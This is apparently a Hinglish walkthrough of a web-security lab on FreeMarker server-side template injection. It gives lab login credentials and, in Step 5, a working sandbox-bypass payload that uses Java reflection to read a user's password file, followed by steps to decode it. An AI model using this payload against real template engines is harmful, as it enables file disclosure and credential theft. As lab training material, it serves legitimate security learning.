### 🔥 Step by Step Solution

**Step 1 – Login**

* Credentials use karo:
  `content-manager:C0nt3ntM4n4g3r`
* Abhi tum `content-manager` user ki account main ho.

---

**Step 2 – Template editing point dhoondna**

* Kisi bhi **product description template** ko edit karo.
* Wahan tumhein syntax `product` object ka access milta hai.
* Example: `${product}` likho → yeh object print karega.

---

**Step 3 – Sandbox check**

* Sabse pehle test karo ke methods accessible hain ya nahi:
  `${product.getClass()}`
* Agar yeh kaam kare, iska matlab sandbox weak hai aur tum Java reflection methods ko chain kar saktay ho.

---

**Step 4 – Useful methods explore karna**

* Har Java object ke pass `getClass()` hota hai → phir `getProtectionDomain()` → phir `getCodeSource()` → phir `getLocation()`
* Is chain se tum file path ya class location tak pohonch saktay ho.

---

**Step 5 – File read payload**
Ab payload dalna hai jo sandbox tod kar file read kare:

```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/home/carlos/my_password.txt").toURL().openStream().readAllBytes()?join(" ")}
```

* Yeh payload ASCII code (bytes) return karega.
* Example output: `122 99 107 120 49 103 ...`

---

**Step 6 – ASCII convert**

* Jo numbers aayein unko ASCII text main convert karo.
* Example: `122 = z`, `99 = c`, etc.
* Iss tarah tumhein **Carlos ka password string** mil jayega.

---

**Step 7 – Lab submit**

* Jo decoded password mila usay "Submit solution" button main daal do.
* ✅ Lab solved.

---

### ⚡ Key Points Yaad Rakhne Wale

* Sandbox ka matlab: restriction environment, lekin agar methods expose hoon to bypass possible hota hai.
* Har Java object → `getClass()` root ban jata hai exploit ka.
* Developer ki ghalti yeh hai ke unhon ne template engine ko untrusted input ke saath allow kar diya.
